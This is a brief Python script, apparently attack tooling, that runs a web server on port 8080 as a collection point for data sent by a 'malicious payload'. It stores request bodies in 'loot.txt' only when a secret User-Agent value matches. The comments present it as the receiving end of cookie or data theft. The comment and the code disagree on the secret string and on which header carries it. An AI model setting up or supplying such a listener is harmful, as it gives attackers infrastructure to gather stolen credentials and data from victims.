# This script starts a basic python web server and opens a port
# it will only accept and save data with a secret header value set
# Change the "your_secret_value" to your malicious payloads cookie value

import http.server
import socketserver

PORT = 8080

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if 'User-Agent' in self.headers and self.headers['User-Agent'] == 'you_secret_value':
            with open('loot.txt', 'a') as f:
                f.write(self.rfile.read().decode('utf-8') + '\n')
                print(self.headers)
        else:
            self.send_response(403)
            self.end_headers()
            print(self.headers)

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()